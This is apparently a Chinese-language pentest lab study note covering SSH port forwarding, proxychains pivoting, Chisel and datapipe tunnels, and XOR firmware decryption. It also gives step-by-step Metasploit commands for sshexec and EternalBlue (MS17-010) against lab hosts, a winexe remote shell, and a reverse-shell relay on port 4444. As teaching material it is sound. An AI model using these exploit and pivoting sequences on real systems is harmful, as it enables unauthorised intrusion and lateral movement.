![image](https://github.com/user-attachments/assets/eb591005-b71b-4e20-8499-419a6375d2c0)Day3
===
SSH Local Port Forwarding
---
    ssh -L *:80:192.168.0.24:80 administrator@192.168.0.70
    可看到本機開了80 Port，遠端連線到192.168.0.70的22 Port
192.168.0.70
  ![image](https://github.com/user-attachments/assets/61e42d6e-f8b8-47de-9abc-d56f7090acdc)
192.168.0.18
  ![image](https://github.com/user-attachments/assets/5c4571fc-8505-49d2-a1de-5572d43f43d9)

    本機瀏覽器127.0.0.1:80 等於 192.168.0.24:80
![image](https://github.com/user-attachments/assets/62274627-a98b-4007-b9f4-84c034e2292c)

    斷線後就無法連接
![image](https://github.com/user-attachments/assets/896a68c0-6d99-4ef3-82d2-d962411f25db)

SSH Remote Port Forwarding
---
    
    先在 192.168.0.70 開啟 GatewayPorts 的設定，不然沒法讓人家連 8008 port
    sudo nano /etc/ssh/sshd_config
    sudo service ssh restart
![image](https://github.com/user-attachments/assets/f86f24b5-d46b-4093-8bf3-2c093b1b1ba5)
![image](https://github.com/user-attachments/assets/97129812-5fa9-4785-8989-a1aa5039e907)
![image](https://github.com/user-attachments/assets/4410ecea-4aa3-4ed0-b68e-08bc3f9b5710)

    ssh -R *:8008:192.168.0.24:80 administrator@192.168.0.70
![image](https://github.com/user-attachments/assets/97b841a1-8a5c-40e3-941c-34d3395c1ab6)

    可看到本機開了兩條連線22、8008
![image](https://github.com/user-attachments/assets/02c997e5-1fda-452f-942a-c8108074c879)

    192.168.0.70也開了兩條連線22、8008
![image](https://github.com/user-attachments/assets/c18e2dc1-f035-4593-8375-50d0d38cb3af)

    本機瀏覽器192.168.0.70:8008 等於 192.168.0.24
![image](https://github.com/user-attachments/assets/c81457a1-7044-4559-9dd1-3bce1297a362)

    斷線後就無法連線
![image](https://github.com/user-attachments/assets/f1be00ca-09f4-45be-a9d1-88f3a79ef725)

SSH dynamic port forwarding
---
    只要連至.18:9050的網路流量都可以透過.70轉發出去
    ssh administrator@192.168.0.70 -CD 9050
    -C：這個選項啟用了SSH壓縮，以減少資料傳輸時的頻寬使用。 它可以提高資料傳輸的效率。
    -D 9050：這是配置動態連接埠轉送的部分。
![image](https://github.com/user-attachments/assets/41aed900-6f0b-4509-bc6c-768a0189c497)

    .18的連線狀況
![image](https://github.com/user-attachments/assets/d008871f-07f4-4f61-81cb-3ff2e8c09f86)

    透過proxychains轉發流量
    sudo nano /etc/proxychains.conf
![image](https://github.com/user-attachments/assets/eecf5c1e-ca6e-4786-a43e-ef34ebcb15e0)

    proxychains winexe -U 'administrator%Pa$$w0rd' //192.168.0.7 cmd.exe
    通過代理伺服器建立到目標 Windows 主機的遠端連接，然後運行 cmd.exe 命令提示字元，以在遠端主機上執行命令。
![image](https://github.com/user-attachments/assets/ec03da12-0c29-40c3-a6e5-bcf228d8a7ae)

    proxychains xfreerdp /v:192.168.0.7 /u:administrator /p:'Pa$$word' /size:90%
    建立到目標 Windows 主機的遠端桌面連接，並以 administrator 用戶登錄，然後調整遠程桌面窗口大小。
![image](https://github.com/user-attachments/assets/8850d77e-3c7b-441b-a583-6952df85127b)

SSH Local Port Forwarding /w Jump Host
---

    ssh -J administrator@192.168.0.70 administrator@192.168.0.10 -L *:80:192.168.0.24:80
    先跳到192.168.0.70在透過192.168.0.10連到192.168.0.24的80 Port
![image](https://github.com/user-attachments/assets/2ee86876-47e8-4aef-82eb-ea71275ae550)

    本機只會看到連線192.168.0.70 22 Port
![image](https://github.com/user-attachments/assets/1dd6e2e8-2e17-4918-bae4-4df6107ca3d4)

    192.168.0.70只看的到連線192.168.0.10 22 Port
![image](https://github.com/user-attachments/assets/6520cd19-e929-4d41-8ea6-767d3746af87)

    瀏覽本機瀏覽器127.0.0.1:80可連接到192.168.0.24的80
![image](https://github.com/user-attachments/assets/0e51a666-bc4b-4f95-850e-0785a8fc553b)

    斷開連線後就無法連線
![image](https://github.com/user-attachments/assets/5e11cc9b-2d0d-4f57-8534-5a1065658791)

Meterpreter Session Routing
---

    MSF
    msfconsole
    use exploit/multi/ssh/sshexec
    set rhosts 172.19.19.70
    set username administrator
    set password Infinit3
    set lhost 172.19.19.18
    exploit
![image](https://github.com/user-attachments/assets/39ebb9d0-4c7e-484a-b5f0-3402bec8f936)

    Meterpreter (Session-Routing)
    run post/multi/manage/autoroute OPTION=s
    run autoroute -p
    background
![image](https://github.com/user-attachments/assets/49ac4283-9f80-4fb3-83fc-70ab73e29d4a)

    MS17_010
    search ms17_010
    use exploit/windows/smb/ms17_010_eternalblue
    show options
    set rhosts 192.168.0.7
    set lhost 172.19.19.18
    check
    exploit
![image](https://github.com/user-attachments/assets/0c80c931-43b2-4000-8b86-45713904e61b)

Datapipe
---
[datapipe](https://github.com/bovine/datapipe/blob/master/datapipe.c) 

    change Line 80: 20 to 999
![image](https://github.com/user-attachments/assets/3606ec73-5646-4406-b999-a38ef1f1ecc1)

    編譯datapipe.c
    gcc datapipe.c –o datapipe
![image](https://github.com/user-attachments/assets/7e4c5c7d-a7e8-417a-837e-a712ec599572)

    將編譯好的datapipe上傳至.70
    python3 -m http.server 8888
    wget 172.19.19.18:8888/datapipe
![image](https://github.com/user-attachments/assets/7ce28c5f-9757-4b61-8409-526a20ed773f)
![image](https://github.com/user-attachments/assets/bc29473f-1394-45cd-9f22-a67d580adfd0)

    Setup datapipe
    datapipe 0.0.0.0 135 192.168.0.7 135
    datapipe 0.0.0.0 445 192.168.0.7 445
    datapipe 0.0.0.0 4444 172.19.19.18 4444
![image](https://github.com/user-attachments/assets/c4a8f73a-b1d9-4d9a-96e0-b9658fea2989)

    MS17_010
    search ms17_010
    use exploit/windows/smb/ms17_010_eternalblue
    show options
    set rhosts 172.19.19.70
    set lhost 192.168.0.70
    check
    exploit
![image](https://github.com/user-attachments/assets/4f5a10d9-d798-4482-8308-0d6bd20b6d97)
![image](https://github.com/user-attachments/assets/82887d19-4b92-4e5e-9ad7-2f2a20817cda)

Chisel
---
    目前有 Windows、Parrot 兩台電腦，想讓 Windows 連結 http://127.0.0.1:8888 就可以瀏覽 Parrot 電腦中的檔案目錄結構。
    架設http server，python3 -m http.server 80
![image](https://github.com/user-attachments/assets/73cf3f15-8465-4f75-b040-02e9830e1c74)

    chisel server –p 443
    chisel client <chisel_server>:443 <remote_addr>:445
    
    Kali架設chisel server
![image](https://github.com/user-attachments/assets/7a2ae0c7-f3b8-442e-a3f1-0e52251cd660)

    Windows端下載Chisel
[Chisel](https://github.com/jpillora/chisel/releases)

    Windows Client連線
![image](https://github.com/user-attachments/assets/47bc4b29-ad25-461b-b2c2-5c2d83bced0b)

    瀏覽本機80，127.0.0.1:80
    
![image](https://github.com/user-attachments/assets/553a47c4-7661-4049-a3dd-20d0cd65be87)
![image](https://github.com/user-attachments/assets/fc04d8a4-cd4e-4f0a-bcaf-570436870c17)

Chisel Reverse
---
    chisel server –p 443 --reverse 
    chisel client <chisel_server>:443 R:<remote_addr>:445

    Windows架設chisel server
![image](https://github.com/user-attachments/assets/d0869e2f-5f6f-4beb-b8f3-d0df96fbff3f)

    Kali Client連線
![image](https://github.com/user-attachments/assets/8c7d4b97-c49c-44c2-95a6-a828eee66845)

    瀏覽本機80，127.0.0.1:80
![image](https://github.com/user-attachments/assets/48dbadd3-d3e9-4341-bb82-7ba335d8bcdb)
![image](https://github.com/user-attachments/assets/d8bdad50-2f82-414f-b798-b191399a63de)

Xcat
---
    binwalk –t  DVRF_v03.bin 列出此檔案的資訊
![image](https://github.com/user-attachments/assets/5ddb4848-ad45-4cdf-88dd-8b56670b9a84)

    binwalk –t encrypted.bin 沒有秀出任何資訊，應是被加密過
![image](https://github.com/user-attachments/assets/9ddb7ea8-33ad-4d24-8bf2-43d43a0502f1)

    hexdump -v -C encrypted.bin 

    binwalk -E encrypted.bin 可觀察到頻率有浮動
![image](https://github.com/user-attachments/assets/9e26310c-1f95-4fe3-bbd8-6fc35fd3fee7)

    hexdump -v -C encrypted.bin | cut -d" " -f3-20 | sort | uniq -c | sort -nr | head -n 20 觀察到有重複111次的16進位的值
![image](https://github.com/user-attachments/assets/1ca3b097-19b7-41e5-a5db-7679fd938e6c)

[Xcat](https://github.com/mstrand/xcat)
    
    chmod +x xcat.py 
    ./xcat.py -x <xor_key> encrypted.bin > decrypted.bin 
    binwalk –t decrypted.bin 
    成功解出檔案資訊
![image](https://github.com/user-attachments/assets/6651448f-89bf-4d22-a028-f30c3de089bf)

XORTool
---
    python -m pip install xortool
![image](https://github.com/user-attachments/assets/cb85b519-c722-424e-939a-bf9581520622)

    xortool enctypted.bin
![image](https://github.com/user-attachments/assets/f0229ee6-7738-46ce-ae6f-e04546dbf439)

    xortool enctypted.bin -l 8 -c 00
![image](https://github.com/user-attachments/assets/62564dee-74ca-418c-a44b-d68c1b0b0074)

    python -c "print(b'\x88D\xa2\xd1h\xb4Z-'.hex())"
![image](https://github.com/user-attachments/assets/0fd2e97a-e8ca-4720-920b-4c6104e4f1e1)

    ./xcat.py -x 8844a2d168b45a2d encrypted.bin > 123.bin
![image](https://github.com/user-attachments/assets/25a37c66-d966-4d67-b787-64c528bacde7)


